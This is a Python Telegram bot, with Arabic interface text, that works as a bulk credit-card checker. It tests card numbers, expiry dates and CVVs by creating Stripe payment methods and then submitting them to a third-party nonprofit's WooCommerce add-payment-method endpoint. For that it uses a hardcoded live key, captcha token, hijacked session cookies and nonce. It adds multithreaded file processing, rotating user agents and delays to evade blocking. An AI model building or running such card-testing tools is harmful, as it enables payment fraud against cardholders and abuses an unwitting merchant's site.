import os
import re
import json
import time
import random
import requests
import asyncio
from datetime import datetime
from concurrent.futures import ThreadPoolExecutor
from telegram import Update, InlineKeyboardButton, InlineKeyboardMarkup
from telegram.ext import Application, CommandHandler, MessageHandler, CallbackQueryHandler, ContextTypes, filters

# ========== CONFIG ==========
TOKEN = "7792196548:AAHaWkIJXqnWxj51IJm0SI4_DWDpiMOCfiU"
ADMIN_ID = "YOUR_TELEGRAM_ID_HERE"  # يمكنك تركها فارغة للسماح للجميع

# ========== STRIPE CHECKER ==========
def check_card(card_data):
    """
    فحص بطاقة عبر Stripe API
    card_data: "NUM|MM|YYYY|CVV"
    """
    try:
        n, mm, yy, cvv = card_data.strip().split('|')
        if len(yy) == 4:
            yy = yy[-2:]
    except:
        return {"status": "error", "message": "صيغة البطاقة غير صحيحة", "card": card_data}

    # ========== HEADERS ==========
    headers = {
        'authority': 'api.stripe.com',
        'accept': 'application/json',
        'accept-language': 'ar-EG,ar;q=0.9,en-US;q=0.8,en;q=0.7',
        'content-type': 'application/x-www-form-urlencoded',
        'origin': 'https://js.stripe.com',
        'referer': 'https://js.stripe.com/',
        'sec-ch-ua': '"9"',
        'sec-ch-ua-mobile': '?1',
        'sec-ch-ua-platform': '"Android"',
        'sec-fetch-dest': 'empty',
        'sec-fetch-mode': 'cors',
        'sec-fetch-site': 'same-site',
        'user-agent': random.choice([
            'Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/139.0.0.0 Mobile Safari/537.36',
            'Mozilla/5.0 (Linux; Android 11; SM-G973F) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/138.0.0.0 Mobile Safari/537.36',
            'Mozilla/5.0 (Linux; Android 12; Pixel 6) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/140.0.0.0 Mobile Safari/537.36'
        ]),
    }

    # ========== DATA ==========
    data = f'type=card&card[number]={n}&card[cvc]={cvv}&card[exp_year]={yy}&card[exp_month]={mm}&allow_redisplay=unspecified&billing_details[address][postal_code]=10008&billing_details[address][country]=US&payment_user_agent=stripe.js%2F286599edca%3B+stripe-js-v3%2F286599edca%3B+payment-element%3B+deferred-intent&referrer=https%3A%2F%2Fwww.friendsofthefrontiertrails.org&time_on_page=60840&client_attribution_metadata[client_session_id]=f27a1133-d261-49ad-93d7-581fbb8f3a0f&client_attribution_metadata[merchant_integration_source]=elements&client_attribution_metadata[merchant_integration_subtype]=payment-element&client_attribution_metadata[merchant_integration_version]=2021&client_attribution_metadata[payment_intent_creation_flow]=deferred&client_attribution_metadata[payment_method_selection_flow]=merchant_specified&client_attribution_metadata[elements_session_id]=elements_session_10F9poksxH0&client_attribution_metadata[elements_session_config_id]=461205dc-7b97-4461-8014-3257e9a030ad&client_attribution_metadata[merchant_integration_additional_elements][0]=payment&guid=c6f603e6-2797-4364-949e-f883396a543977e57c&muid=0ee8bdc4-970a-4a24-bc31-72451c21de9544e3bd&sid=05285dbe-70b6-4947-960a-fa7504f22380d756b6&key=pk_live_51RIXBk09PaUGH45i1GzrqdOXx7ul9UhZcFCGnQu7bkO2Z7wfbIBbMu6QBI8zCbnwIb1pcD8npeJmhaMOzfj9wl6b00CxJnqjz7&radar_options[hcaptcha_token]=P1_eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJwZCI6MCwiZXhwIjoxNzg0MzE4NTI5LCJjZGF0YSI6IjloazFxcHd3VzNCSU9XRDJDYktOenVTQ2szamJ1UmpKSDlWL2VUQisydXJOVFdQT3hiVGo4bnFnMUU4RzVhUUZqcFo2NHpMMjRpbUxWUHlQTFhVL2UvT1ltaHNrWCtOR2JZa1JWZlE0Qno4MzRqNDk5bHZIc3QvUlZrc1FvbnBPVWxwMHQ4UlE5eDZ5M2ZqNHJ1c3FjbXNVNHBvVFdrN0h1MDlNQks1eGFPQUZsRWcrL3lNQ1FNdTlmRmlOMkZXZk9FSTNtRmRWM0REMHpsemFkU0J3UytBd1JzbjdqMTM5Wkp4TXhpV3dmUldRSGtabTFxTkJ4OGpkYzZMTnM4cFJBUGNEQmVRWk5xOVNBaVA0UURraWd1UHNNbTdQWjQxNk4xS3oya1dOallBSUJwMExvZFNhQXB4WThZVmtuc3dyUGlxaEJ6SVZFekpmTWxITjU5SGFjZXB2YVdCVkQ4aXZpSG1pK2FRTllJRT1iUDhuYUZkMDZQMTZBOVZvIiwicGFzc2tleSI6Inp5MnR0UWVqeXNzZWdJdmk1SWJPUVViMFNSNElncUJpOHdOU3FlNnUzSUpNSjR3enFQUzBRcjRXMGNYODBYaFB0SXdxS29xYnpRWnk5TjZHSENNTFRNcXVnOGlxNmt0dTdlMEJmaEZkY1grdUhpL0VzWVA3WVlzUXNpeStCdjRnOVoxakZXbWlJcXhSc2xsUU9senlqVmtxN294R3Yyemo5eWpqK2xUR0FOVk4wb0VlUnFUbENXRTJMeXBLam9EdDdrWlVSQVoyN0VOK3k2bnRic2g2dWJnRDV1Q2ZEMDh5c2VrWFI4c0xydEpmT2p1Tk1MeERXQ3V4Q0VBVXhlMVB4MU9nd2V5VEh3eXRiWGFnWUF0TjNSWnJBam5DUkJFOG9vM0dqNUFYUWtVM1lkUEFZbkE2dm00dHQ0MjJ5aXlDSENYUG5qalpvakFXZ1l4dmx3YmZqTjZBRW1NaHBSa3VTK0o2a1hjY1hkNE5Pek80Tm0xczdpczdUSkhPVnhPVnB6N0pubHBzeitmelB5TjBWaG9nOG0rb3JNRFVDV1JONnZnVmNKaHVONk5DNEpiTEF4dHdWdVFrdDNDaFZ4bU04aUg5Z2tzRjlISHFJakJXbWw2b2hZcjhTSyszKzc0THplUkR3aER0cHhXMjl2UGFIckhBaWdTNTVBaXZkWFFuOXIvRkxqVnIrRlh4bW9qSDRvUWtpQ0NRZk42ZzVyOS9vYnlpNTE1QVhwU1hhUGtZTGtFUFk4VlFPRVUrdDF6NGgxMXB3ZGRaSkJIVnhLK29vZ0syMEhsSERSRWtGcmprUHcrRDQxdFFCM3ZmWHc1WHpSdy9TWmVwNllHUTEyeUxFQWtTMFlhVE1iSjVBNWVWUkhxeHRucVhaMkJ0YnA4Uk4yZTEzM3UxdUZySnIwdHM1b2NKTWNSUXVLSGRqZ0djU3FLb0M1K1Q4Yk1yYXBQTXlqU0o2cDFmQ29qbndMSmVsZzZFUzBaeENlVHppdzE0Q1kzOW1TWXVTTTZQTnEvd1V5cW01dndubTNjQlh0NW1uTU1CNC92UFZlNi9zU1ljdm5WUlZ2RFYyN0xQaTNNODZhaTRrSzlvM3lVMjUzYUdob0dEblFYUHN4ZHl3YnZwN2JheGJHcTd5TW1hQnJFVkxKMFFTNHlPWkc1LzNvV0VUMUdtL2dYNUY0a3FWVjM1VEhQekhMcEp4azJMeGRhcjJuTnh1b0dadmx4ZEQwUFRBSng4Tjl6dFd5ZlFBWU9VRUplVVFWY3JWaHJuQUhONmY0Mzh3M1RhM1BtLytRTG42bFMrNXdyTjZEMlZUV3kxMDMyb1pBS3U3RXFmL0hqMi9HSEhBU0tXaDAwTHczNUlXcGtLK3dDNnh2c0JKdmpMdmdxSXRuSXhIREZ5Yno5bEJzeE1zMUlTUzd6VzhOdWNTQTBCdHhkZ0NWZ094VHRoSStBTzZ6TUpKekxSa0lMOWRzTHRlNDJqTkJBc2gyZ1ZzTFRMQkozTmgyUksva3U0OWtCSjZ5ZU5MdlBGZXgwWEZ2dnJjVzc0SEE5SmlrOUpxNWxpSHlUSEVhNnJHR2M4T2ZtWWxpYTZCSnZDNHd4cXdMblRGLzRVQVJWVmlNaFRlVTVtSndqaU53ZmFLTGZFNzR5bldMbGh3M1FCWTh4MGExNnVabWszcFZ2ckV5cCtIaUpTTGd2NU83UFhaZ25PQW5OZVdsMERMT3Y1WlNpZmNUSmlPdkdYTnlBbTRvL3FYOWVGczg3TzFKRkIwbXZ0T0JLdHd3RHB6UGh5ajBPc1dXODNRM2hmTzA0WFhtdnh5Z2pCNkNOOTFFa3VWUG5jNEVnWVkwU2NxMmRTbEdGYmZXREZuUlllNFdPMDRmcGdzZVI5QlVVVldjRnBIdkMxOGo1ODhWRVMwcUhzc2d4UjBXbmtTZXh2bktRYVJKbzcwSVdqL1FxbUxWSkFnZHVWN0RwL1FpN2JJWVdvSnpPTjdod0tUUDN1M3FRRVFLY1djM0w1S0F0UDFJQ1NjYWtZSE8zUko4NDRRanhEUllzVDIvTHFzSFpXdEltQVB5b0xzaVNUa0JqTlBjN2FoeU52eGNnRFAxZUh1QmZZTWZnSWgvTTVIZDB3eWpCeldsc0pUQUVMdU14TkZ6SktXczlUSEVzK3B6ZnpmOWh5SXMzYlVXejM5Q2VHWTU3SjhNSjhQcktQaVJ1Sy9tbTd3WU1ybTBVQ2xtMXdXUTdBc3M3dm8zakxNa1Z3OU5LcnkybWlWUy9WbHVaZDluWi9ES0x1b0MvK0FjTVVJQTN6cTJ4aTRRb0VjOSt2T0ROdTlDcVJzTDdySnZtenRvQ0diSDFrZUJCSUNYZlpTbEM2L01LUU5YVnFIa052R05hTkFBNkd1cytRNGNBR2NDdmZoNjZzSmFkWkE4QThxdFp5NWtmZjJ6MmhGaStLbGE3VmNZM3RyZFdjSkJsb0lnUlFCWmE5aGRwdzVkR2Q0TCs5bTlkOXZLSDk3QWxwR2RWc3R3Q1dNdVB5UzlyT2tDc0w0ZWdwM2t3QWNqclNFUlFrMEp0aXl5YVg3b3R4eXNyL2RPOXUxc294ejVsTDZudXNpbTM5dE8wY1JXSzdZb1pObkFrUERvaUNudHF5M0RpUWx2T2lBc1NHMDRUT2owYkxrLzNpMjB3RmRPSTZ4TlV2cUNsR1ZidmUwM1h4R1JYVHNmSzYyV3l5NTFQd0ZGdEh6WkxTSm5XTHZWcVRQNjA2REUvOHd4STRuQ3QwRE5mZzdYVk0ydzE1Y05XT1RBPT0iLCJrciI6IjQ3NjAxODM4Iiwic2hhcmRfaWQiOjUzNTc2NTU5fQ.muFVrzAnVvgV29mncpuOUhHteR3oQL0sW7K725xtID0'

    try:
        response = requests.post('https://api.stripe.com/v1/payment_methods', headers=headers, data=data, timeout=15)
        result = response.json()
        
        if 'id' in result:
            payment_id = result['id']
            # ========== SECOND REQUEST ==========
            cookies = {
                'wordpress_sec_e0e129985469e661389f92d7c897acb4': 'midoo9aahmed%7C1785527912%7CPBWkQkm1g3Fg59Vek17eKAYlqqJ64YL1jgyuFxZMcsw%7Cdc49c775b0a39df40ccaa65d1a4f0548d7bcb9572cb3137b7d944211457e4e59',
                '_ga': 'GA1.1.137119143.1784318293',
                '__stripe_mid': '0ee8bdc4-970a-4a24-bc31-72451c21de9544e3bd',
                '__stripe_sid': '05285dbe-70b6-4947-960a-fa7504f22380d756b6',
            }
            headers2 = {
                'authority': 'www.friendsofthefrontiertrails.org',
                'accept': '*/*',
                'accept-language': 'ar-EG,ar;q=0.9,en-US;q=0.8,en;q=0.7',
                'content-type': 'application/x-www-form-urlencoded; charset=UTF-8',
                'origin': 'https://www.friendsofthefrontiertrails.org',
                'referer': 'https://www.friendsofthefrontiertrails.org/my-account/add-payment-method/',
                'user-agent': random.choice([
                    'Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/139.0.0.0 Mobile Safari/537.36',
                    'Mozilla/5.0 (Linux; Android 11; SM-G973F) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/138.0.0.0 Mobile Safari/537.36'
                ]),
                'x-requested-with': 'XMLHttpRequest',
            }
            data2 = {
                'action': 'wc_stripe_create_and_confirm_setup_intent',
                'wc-stripe-payment-method': payment_id,
                'wc-stripe-payment-type': 'card',
                '_ajax_nonce': '3ec581a8eb',
            }
            response2 = requests.post(
                'https://www.friendsofthefrontiertrails.org/wp-admin/admin-ajax.php',
                cookies=cookies,
                headers=headers2,
                data=data2,
                timeout=15
            )
            result2 = response2.json()
            
            if result2.get('success') == False:
                error_msg = result2.get('data', {}).get('error', {}).get('message', 'Unknown error')
                return {"status": "declined", "message": error_msg, "card": card_data, "id": payment_id}
            else:
                return {"status": "approved", "message": "Success! Card is valid.", "card": card_data, "id": result2.get('id', payment_id)}
        else:
            return {"status": "error", "message": result.get('error', {}).get('message', 'Unknown error'), "card": card_data}
    except Exception as e:
        return {"status": "error", "message": str(e), "card": card_data}

# ========== TELEGRAM BOT ==========
app = None  # سيتم تعيينه لاحقاً

async def start(update: Update, context: ContextTypes.DEFAULT_TYPE):
    user_id = str(update.effective_user.id)
    if ADMIN_ID and user_id != ADMIN_ID:
        await update.message.reply_text("🚫 غير مصرح لك باستخدام هذا البوت.")
        return
    
    keyboard = [
        [InlineKeyboardButton("💳 فحص بطاقة فردية", callback_data="single")],
        [InlineKeyboardButton("📁 فحص ملف بطاقات", callback_data="file")],
        [InlineKeyboardButton("📊 الإحصائيات", callback_data="stats")],
        [InlineKeyboardButton("🗑 مسح النتائج", callback_data="clear")],
    ]
    await update.message.reply_text(
        "🔥 **بوت فحص بطاقات Stripe**\n"
        "اختر إحدى الخيارات أدناه:",
        reply_markup=InlineKeyboardMarkup(keyboard)
    )

async def button_handler(update: Update, context: ContextTypes.DEFAULT_TYPE):
    query = update.callback_query
    await query.answer()
    user_id = str(update.effective_user.id)
    
    if ADMIN_ID and user_id != ADMIN_ID:
        await query.edit_message_text("🚫 غير مصرح لك.")
        return
    
    data = query.data
    
    if data == "single":
        await query.edit_message_text(
            "💳 أرسل البطاقة بهذه الصيغة:\n"
            "`رقم_البطاقة|شهر|سنة|CVV`\n"
            "مثال: `4499410922576229|05|28|806`"
        )
        context.user_data['mode'] = 'single'
    
    elif data == "file":
        await query.edit_message_text(
            "📁 أرسل ملف نصي يحتوي على بطاقات\n"
            "كل بطاقة في سطر منفصل بالصيغة:\n"
            "`رقم_البطاقة|شهر|سنة|CVV`"
        )
        context.user_data['mode'] = 'file'
    
    elif data == "stats":
        ok_count = 0
        decl_count = 0
        err_count = 0
        if os.path.exists("results.txt"):
            with open("results.txt", "r") as f:
                for line in f:
                    if "Approved" in line: ok_count += 1
                    elif "Declined" in line: decl_count += 1
                    elif "Error" in line: err_count += 1
        await query.edit_message_text(
            f"📊 **الإحصائيات:**\n"
            f"✅ موافق: {ok_count}\n"
            f"❌ مرفوض: {decl_count}\n"
            f"⚠️ خطأ: {err_count}"
        )
    
    elif data == "clear":
        if os.path.exists("results.txt"):
            os.remove("results.txt")
        await query.edit_message_text("🗑 تم مسح جميع النتائج.")

async def handle_message(update: Update, context: ContextTypes.DEFAULT_TYPE):
    user_id = str(update.effective_user.id)
    if ADMIN_ID and user_id != ADMIN_ID:
        await update.message.reply_text("🚫 غير مصرح لك.")
        return
    
    mode = context.user_data.get('mode', 'single')
    text = update.message.text
    
    # ===== SINGLE CARD =====
    if mode == 'single' and text:
        result = check_card(text)
        await send_result(update, result)
        context.user_data['mode'] = None
    
    # ===== FILE =====
    elif mode == 'file' and update.message.document:
        file = await update.message.document.get_file()
        file_path = f"temp_{user_id}.txt"
        await file.download_to_drive(file_path)
        
        with open(file_path, "r") as f:
            cards = f.readlines()
        os.remove(file_path)
        
        if not cards:
            await update.message.reply_text("⚠️ الملف فارغ أو غير صالح.")
            return
        
        await update.message.reply_text(f"⏳ جاري فحص {len(cards)} بطاقة...")
        
        results = []
        with ThreadPoolExecutor(max_workers=10) as executor:
            futures = [executor.submit(check_card, card.strip()) for card in cards if card.strip()]
            for future in futures:
                results.append(future.result())
        
        # حفظ النتائج
        with open("results.txt", "a") as f:
            for res in results:
                f.write(f"{res['card']} | {res['status']} | {res['message']}\n")
        
        # إرسال النتائج
        for res in results:
            await send_result(update, res)
            await asyncio.sleep(0.5)  # تجنب الحظر
        
        context.user_data['mode'] = None

async def send_result(update, result):
    card = result['card']
    status = result['status']
    msg = result['message']
    
    if status == "approved":
        emoji = "✅"
        color = "موافق"
        keyboard = InlineKeyboardMarkup([[
            InlineKeyboardButton("✅ Approve", callback_data="approve"),
            InlineKeyboardButton("❌ Decline", callback_data="decline"),
            InlineKeyboardButton("⚠️ Error", callback_data="error"),
        ]])
        await update.message.reply_text(
            f"{emoji} **{color}**\n"
            f"💳 `{card}`\n"
            f"📝 {msg}",
            reply_markup=keyboard
        )
    elif status == "declined":
        emoji = "❌"
        color = "مرفوض"
    else:
        emoji = "⚠️"
        color = "خطأ"
    
    await update.message.reply_text(
        f"{emoji} **{color}**\n"
        f"💳 `{card}`\n"
        f"📝 {msg}"
    )

# ========== MAIN ==========
def main():
    global app
    app = Application.builder().token(TOKEN).build()
    
    app.add_handler(CommandHandler("start", start))
    app.add_handler(CallbackQueryHandler(button_handler))
    app.add_handler(MessageHandler(filters.TEXT & ~filters.COMMAND, handle_message))
    app.add_handler(MessageHandler(filters.Document.ALL, handle_message))
    
    print("🔥 البوت شغال...")
    app.run_polling()

if __name__ == "__main__":
    main()
